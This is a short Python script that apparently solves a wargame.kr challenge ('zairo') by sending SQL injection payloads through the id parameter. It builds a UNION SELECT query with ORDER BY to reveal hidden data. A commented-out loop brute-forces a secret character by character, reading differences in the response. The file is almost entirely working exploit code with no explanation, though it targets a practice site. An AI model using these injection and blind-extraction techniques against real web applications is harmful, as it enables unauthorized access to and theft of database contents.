from requests import *
from urllib.parse import *
query="zairowkdlfhdkel' union select 1,'y',3,4,5 order by 4 desc #"
query=quote(query)
url=f"http://wargame.kr:8080/zairo?pw=&flag=abs&id={query}"
response=get(url=url)
print(url)
print(response.text)
'''
tmp='!"#$%&)*+,-./0123456789:;<>?@abcdefghijklmnopqrstuvwxynz[\]^_`{|}~'
for i in range(len(tmp)):
    url=f'http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel\' union select 1,2,3,\'{tmp[i]}\',5 order by 4 asc %23'
    response=get(url=url)
    #print(url)
    #print(response.text)
    if response.text.find('2') == -1 and response.text.find('zairowkdlfhdkel') == -1:
        print(tmp[i])
'''